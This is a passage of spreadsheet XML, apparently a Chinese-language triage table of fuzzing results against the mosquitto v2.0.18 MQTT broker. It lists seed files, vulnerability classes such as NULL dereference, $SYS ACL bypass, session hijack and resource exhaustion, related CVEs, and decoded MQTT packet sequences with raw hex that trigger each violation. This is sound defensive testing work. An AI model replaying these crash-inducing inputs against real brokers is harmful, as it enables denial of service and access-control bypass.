          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C266" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(39B)\u000a4.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66" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 417B (报告+请求数据)\u000a请求数据: 39B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(39B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1475 Topics=[''(零长度!QoS=1)] | raw_header=822305c300001d245359532f62726f6b\u000aMsg[2]: (不完整,2B) raw=c014\u000a(尾部2B): c014</f>
        <v/>
      </c>
      <c r="F2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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J26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6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7">
      <c r="A267" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B267" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C267" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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67" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0042 ===\u000a大小: 803B (报告+请求数据)\u000a请求数据: 108B\u000a\u000a---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MQTT请求序列(108B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2823 Topics=['$SYS/broker/clients/connected'(QoS=2), '$share/grp1/test/+'(QoS=1), ''(零长度!QoS=2)] | raw_header=823a0b07001d245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x0b\x08Éìí\x99Ë\x1fîqdv\x902\x9c\x10ý·\x87\x87¥\x89\x90\x91' | raw_header=322d0013245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=02</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J26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68">
      <c r="A268" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B268" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C268" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(157B)\u000a4.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68" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 723B (报告+请求数据)\u000a请求数据: 157B\u000a\u000a---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MQTT请求序列(157B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1511 Topics=[''(零长度!QoS=1)] | raw_header=823605e700001d245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=75B | raw_header=356200152473686172652f6772702f74\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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6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69">
      <c r="A269" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B269" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C269" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(72B)\u000a4.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69" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 953B (报告+请求数据)\u000a请求数据: 72B\u000a\u000a---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MQTT请求序列(72B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=5217 Topics=[''(零长度!QoS=2), 'a/b/c/d/e'(QoS=2)] | raw_header=821114610000020009612f622f632f64\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload='õn\x1cXV\x81âGx³g\u00090XØP\x1b\x84æ\x930°RÃ\x87@\x88\x18L' | raw_header=39320013245359532f62726f6b65722f\u000aMsg[3]: CONNACK  | raw_header=27</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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0">
      <c r="A270" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B270" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C270" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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70" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 717B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(7B原始二进制) ---\u000aMsg[1]: (不完整,7B) raw=820b0001000003\u000a(尾部7B): 820b0001000003</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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7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71">
      <c r="A271" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B271" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C271" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(176B)\u000a4.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0x02c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E271" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c4 ===\u000a大小: 1425B (报告+请求数据)\u000a请求数据: 176B\u000a\u000a---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MQTT请求序列(176B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=678 Topics=['+/data'(QoS=1), ''(零长度!QoS=2), '$share/grp1/test/+'(QoS=0)] | raw_header=822302a600062b2f6461746101000002\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=2 retain=True payload='\x02§\x14_(\x02y$ÑQ:\x06hó\x9a\x96"ú¹Ý\x1e~1¸BíÌ\x0c\x05ã\x1bÚÃ' | raw_header=3d4e002b766572792f646565702f746f\u000aMsg[3]: PUBCOMP PacketID=1284 | raw_header=701505044d35545480ffffff00096166\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=[] | raw_header=820b00011806746573742f2300\u000aMsg[5]: PUBLISH Topic='t\x82à\x82\x0b\x00\x03\x00\x06' QoS=1 retain=True payload='testlly' | raw_header=331200097482e0820b00030006746573\u000aMsg[6]: (不完整,3B) raw=067002\u000a(尾部3B): 067002</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J27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7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72">
      <c r="A272" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B272" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C272" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(127B)\u000a4.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72" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 773B (报告+请求数据)\u000a请求数据: 127B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(127B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=101 Topics=['sensor/temp'(QoS=0), '$share/grp2/sensor/#'(QoS=2), '$share/grp2/sensor/#'(QoS=0)] | raw_header=823e0065000b73656e736f722f74656d\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload='\x00f\x1e\x00f±\x9ca\'ú¤ùM\äFî\x18Ô\x9að\x98\x17kåØ\x95'Ü\x00\x89À\x1f\x8a&amp;Ð&amp;' | raw_header=343b0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=13ff\u000a(尾部2B): 13ff</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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3">
      <c r="A273" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B273" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C273" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(182B)\u000a4.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73" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 2267B (报告+请求数据)\u000a请求数据: 182B\u000a\u000a---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MQTT请求序列(182B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3861 Topics=[] | raw_header=82560f152c26001c2473686172652f67\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=60B | raw_header=3d5b001d245359532f62726f6b65722f\u000aMsg[3]: PUBLISH  | raw_header=39</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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7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4">
      <c r="A274" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B274" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C274" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(587B)\u000a4.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74" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 2530B (报告+请求数据)\u000a请求数据: 587B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(587B原始二进制) ---\u000aMsg[1]: UNSUBSCRIBE  | raw_header=ad0100\u000aMsg[2]: AUTH  | raw_header=f9262626262626262626262626262626\u000aMsg[3]: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PUBREL PacketID=29231 | raw_header=6b65722f636c69656e74732f636f6e6e\u000aMsg[7]: UNSUBSCRIBE  | raw_header=ab7e4149a742a771358e2774007751b6\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626322626262626\u000aMsg[9]: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(不完整,33B) raw=262626262626262626262626262626262626262626262626262626262626262626\u000a(尾部33B): 262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F2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4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74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74" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J274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74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75">
      <c r="A275" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B275" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C275" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:3,cat:00c2)中的REQUEST DATA提取出来(25709B)\u000a4.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275" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c2 ===\u000a大小: 4958B (报告+请求数据)\u000a请求数据: 25709B\u000a\u000a---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MQTT请求序列(25709B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=29556 | raw_header=746573742f1c10737373737373737373\u000aMsg[2]: PUBREC PacketID=512 | raw_header=540402008216\u000aMsg[3]: TYPE0  | raw_header=010100\u000aMsg[4]: TYPE0  | raw_header=0d820b0001000480ff04020082160139\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=262626267f2626262626262626262626\u000aMsg[6]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[7]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[8]: CONNACK session_present=38 reason_code=230 | raw_header=262626e6262626262626262626262626\u000aMsg[9]: CONNACK session_present=38 reason_code=102 | raw_header=26262666262626262626262626262626\u000aMsg[10]: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reason_code=192 | raw_header=262626c0002626262626262626262626\u000aMsg[22]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[23]: (不完整,2044B) raw=00fa2626262626262626262626262626262626262626262626262626262626262626262626262626\u000a(尾部2044B): 00fa262626262626262626262626262626262626262626262626262626262626262626262626262626262676262626262626</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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7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6">
      <c r="A276" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B276" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C276" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(313B)\u000a4.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76" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 2322B (报告+请求数据)\u000a请求数据: 313B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(313B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10430000000000000000ff7fffff0000\u000aMsg[2]: TYPE0  | raw_header=000100\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=00200000000000000000000000000000\u000aMsg[6]: TYPE0  | raw_header=00ff0033514751000000000010000000\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: TYPE0  | raw_header=0000\u000aMsg[10]: (不完整,67B) raw=00ff0000000000000000000000000000000000000000000000000000000000000000000000000000\u000a(尾部67B): 00ff0000000000000000000000000000000000000000000000000000000000000000000000000000ff0033514751515b4cf1</f>
        <v/>
      </c>
      <c r="F2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7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76" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J27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7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77">
      <c r="A277" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B277" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C277" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(220B)\u000a4.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77" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0102 ===\u000a大小: 1081B (报告+请求数据)\u000a请求数据: 220B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(220B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=8 Topics=[] | raw_header=825500082a260013245359532f62726f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=96B | raw_header=38750013245359532f62726f6b65722f\u000aMsg[3]: (不完整,14B) raw=101500024d5154540402745f6330\u000a(尾部14B): 101500024d5154540402745f6330</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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7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8">
      <c r="A278" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B278" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C278" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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278" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0103 ===\u000a大小: 787B (报告+请求数据)\u000a请求数据: 114B\u000a\u000a---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MQTT请求序列(114B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=272 Topics=['a/b/c/d/e'(QoS=1)] | raw_header=820e01100009612f622f632f642f6501\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=62B | raw_header=3c5d001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=03fa85\u000a(尾部3B): 03fa85</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J27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7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79">
      <c r="A279" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B279" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C279" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(105B)\u000a4.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79" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0181 ===\u000a大小: 929B (报告+请求数据)\u000a请求数据: 105B\u000a\u000a---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MQTT请求序列(105B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1ce30000000000000000000000000000\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=05</f>
        <v/>
      </c>
      <c r="F2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7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79" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J27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7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80">
      <c r="A280" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B280" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C280" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(695B)\u000a4.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280" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0182 ===\u000a大小: 1745B (报告+请求数据)\u000a请求数据: 695B\u000a\u000a---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MQTT请求序列(695B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=34899 | raw_header=7f7e8853cbfc1b1b1b1b1b1b1b1b1b1b\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b121b1b1b1b1b1b\u000aMsg[4]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1bfa1a1b1b1b1b1b1b1b1b1b\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[7]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1bac1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[8]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[9]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[10]: SUBSCRIBE PacketID=137 Topics=[] | raw_header=82110089050bf1d7d80500062b2f6461\u000aMsg[11]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=True payload_len=162B | raw_header=3bc101001d245359532f62726f6b6572\u000aMsg[12]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b12\u000aMsg[13]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1bfa1a1b1b1b\u000aMsg[14]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[15]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b1b\u000aMsg[16]: (不完整,4B) raw=1b1b3800\u000a(尾部4B): 1b1b3800</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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81">
      <c r="A281" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B281" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C281" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(172B)\u000a4.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281" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0183 ===\u000a大小: 1032B (报告+请求数据)\u000a请求数据: 172B\u000a\u000a---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MQTT请求序列(172B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2f00\u000aMsg[2]: SUBSCRIBE PacketID=19793 Topics=[] | raw_header=82044d51543c\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['test/topic'(QoS=0), 'home/+/temperature'(QoS=1), '$SYS/broker/clients/connected'(QoS=2)] | raw_header=82440001000a746573742f746f706963\u000aMsg[4]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload='\x00\x02%F=¢q¹D¹v\u00adÝ\x82æ' | raw_header=352e001d245359532f62726f6b65722f\u000aMsg[5]: TYPE0  | raw_header=0402003c\u000aMsg[6]: TYPE0  | raw_header=0007667a7a5f6332c0\u000aMsg[7]: (不完整,33B) raw=fc820b00010006746573742f2301320f0006746573742f62000a776f726c64e000\u000a(尾部33B): fc820b00010006746573742f2301320f0006746573742f62000a776f726c64e000</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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82">
      <c r="A282" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000008,sev:3,cat:01c0</t>
        </is>
      </c>
      <c r="B282" s="2" t="inlineStr">
        <is>
          <t>会话碰撞漏洞 - 空ClientID导致多客户端共享会话</t>
        </is>
      </c>
      <c r="C282" s="2" t="inlineStr">
        <is>
          <t>N/A (MQTT协议会话碰撞模式)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000008,sev:3,cat:01c0)中的REQUEST DATA提取出来(2008B)\u000a4.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282" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:01c0 ===\u000a大小: 2915B (报告+请求数据)\u000a请求数据: 2008B\u000a\u000a---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MQTT请求序列(2008B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=30717 | raw_header=414577fd414141414141414141414141\u000aMsg[2]: PUBACK PacketID=16705 | raw_header=417f4141414141414141414141414141\u000aMsg[3]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[4]: PUBACK PacketID=16705 | raw_header=41414141416141414141414141414141\u000aMsg[5]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[6]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[7]: PUBACK PacketID=16705 | raw_header=41414141414141345341414141414141\u000aMsg[8]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[9]: PUBACK PacketID=16705 | raw_header=4141414141314141414141414c414141\u000aMsg[10]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[11]: PUBACK PacketID=16705 | raw_header=4141414141f000414141414141414141\u000aMsg[12]: PUBACK PacketID=16705 | raw_header=41414141354101414141414141414141\u000aMsg[13]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[14]: PUBACK PacketID=16705 | raw_header=4141414141e000414141414141414141\u000aMsg[15]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[16]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[17]: PUBACK PacketID=16705 | raw_header=41414141414141414141410100414141\u000aMsg[18]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=146465766900002f2bc0c0c0c0c0c0c0\u000aMsg[19]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[20]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626012626262626262626\u000aMsg[21]: CONNACK session_present=38 reason_code=38 | raw_header=262626262626e0002626262626262626\u000aMsg[22]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626ff2626262626262626\u000aMsg[23]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[24]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626ff0000ff26262626262626\u000aMsg[25]: CONNACK session_present=38 reason_code=38 | 